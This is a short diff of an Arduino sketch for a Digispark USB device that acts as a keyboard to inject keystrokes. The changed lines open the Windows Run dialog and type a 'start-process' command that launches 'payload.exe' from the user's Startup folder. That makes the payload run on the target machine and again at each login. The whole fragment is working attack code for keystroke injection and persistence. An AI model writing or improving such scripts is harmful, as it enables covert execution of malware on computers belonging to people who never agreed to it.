@@ -66,8 +66,8 @@ void setup() {
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(900);
-  printText(F("%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe"));
+  DigiKeyboard.delay(1000);
+  printText(F("start-process %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe"));
   //powershell start-process
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(900);
